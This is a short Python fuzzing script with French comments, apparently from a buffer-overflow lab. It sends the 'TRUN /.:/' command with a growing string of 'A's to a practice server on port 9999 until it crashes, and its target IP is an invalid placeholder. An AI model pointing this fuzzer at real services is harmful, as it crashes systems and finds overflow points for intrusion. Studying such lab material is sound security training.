#!/usr/bin/python
import sys, socket
from time import sleep

# SCRIPT DE FUZZING POUR LE BUFFER TRUN

buffer = 'A' * 100

# A MODIFIER
host_ip = '192.168.1.690'
host_port = 9999

while True:
	try:
		# Essaye de se connecter -> AF_INET = IPv4, SOCK_STREAM = Port
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host_ip, host_port))
		
		# Envoie un TRUN /.:/ (format repéré dans le spiking) avec le buffer (AAAA...)
		s.send(('TRUN /.:/' + buffer))
		s.close()

		# Attend une seconde
		sleep(1)
		# Ajoute 100 A au buffer
		buffer = buffer + "A"*100

	except:
		# Message au crash
		print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()